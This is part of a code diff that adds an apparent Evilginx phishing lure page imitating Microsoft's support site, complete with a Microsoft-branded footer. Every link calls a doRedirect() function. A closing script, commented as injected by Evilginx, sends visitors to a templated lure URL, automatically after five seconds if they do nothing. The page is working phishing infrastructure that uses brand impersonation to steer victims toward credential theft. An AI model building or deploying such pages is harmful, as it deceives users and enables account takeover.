+        <a href="#" onclick="doRedirect(); return false;">Go to forums →</a>
+      </div>
+
+      <!-- Privacy & Security -->
+      <div class="support-opt" onclick="doRedirect()">
+        <span class="icon">
+          <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M18 2 L32 7 L32 18 Q32 29 18 34 Q4 29 4 18 L4 7 Z"
+                  stroke="#0078d4" stroke-width="2" stroke-linejoin="round"/>
+            <rect x="12" y="18" width="12" height="9" rx="2" stroke="#0078d4" stroke-width="2"/>
+            <path d="M14 18 L14 14 Q14 10 18 10 Q22 10 22 14 L22 18" stroke="#0078d4" stroke-width="2" stroke-linecap="round"/>
+            <circle cx="18" cy="22.5" r="1.8" fill="#0078d4"/>
+          </svg>
+        </span>
+        <h4>Privacy &amp; security</h4>
+        <p>Resources to help protect your data and account security.</p>
+        <a href="#" onclick="doRedirect(); return false;">Learn more →</a>
+      </div>
+
+    </div>
+  </section>
+
+</main>
+
+<!-- ══════════════════════════════ FOOTER ══════════════════════════════ -->
+<footer>
+  <div class="footer-grid">
+    <div class="footer-col">
+      <h4>What's New</h4>
+      <ul>
+        <li><a href="#" onclick="doRedirect(); return false;">Surface devices</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Copilot</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">AI features in Microsoft 365</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Windows 11 updates</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Explore all products</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Microsoft Store</h4>
+      <ul>
+        <li><a href="#" onclick="doRedirect(); return false;">Account profile</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Download Center</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Store support</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Returns</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Order tracking</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Education</h4>
+      <ul>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft in education</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Devices for education</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Teams for Education</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft 365 Education</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Educator training</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Business</h4>
+      <ul>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Cloud</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Security</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Dynamics 365</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft 365 for business</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Power Platform</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Developer &amp; IT</h4>
+      <ul>
+        <li><a href="#" onclick="doRedirect(); return false;">Azure</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Developer Center</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Microsoft Learn</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">AppSource</a></li>
+        <li><a href="#" onclick="doRedirect(); return false;">Visual Studio</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="footer-bottom">
+    <div class="footer-bottom-links">
+      <a href="#" onclick="doRedirect(); return false;">Sitemap</a>
+      <a href="#" onclick="doRedirect(); return false;">Contact Microsoft</a>
+      <a href="#" onclick="doRedirect(); return false;">Privacy</a>
+      <a href="#" onclick="doRedirect(); return false;">Manage cookies</a>
+      <a href="#" onclick="doRedirect(); return false;">Terms of use</a>
+      <a href="#" onclick="doRedirect(); return false;">Trademarks</a>
+      <a href="#" onclick="doRedirect(); return false;">About our ads</a>
+      <a href="#" onclick="doRedirect(); return false;">EU Compliance</a>
+    </div>
+    <span class="footer-locale">© Microsoft 2026</span>
+  </div>
+</footer>
+
+<script>
+  // Injected by Evilginx — {lure_url_html} is replaced with the final redirect URL
+  var REDIRECT_URL = "{lure_url_html}";
+
+  function doRedirect() {
+    if (REDIRECT_URL && REDIRECT_URL.indexOf('{') === -1) {
+      window.location.href = REDIRECT_URL;
+    }
+  }
+
+  // Auto-redirect after 5 seconds if the user doesn't interact
+  setTimeout(function () {
+    doRedirect();
+  }, 5000);
+</script>
+
+</body>
+</html>
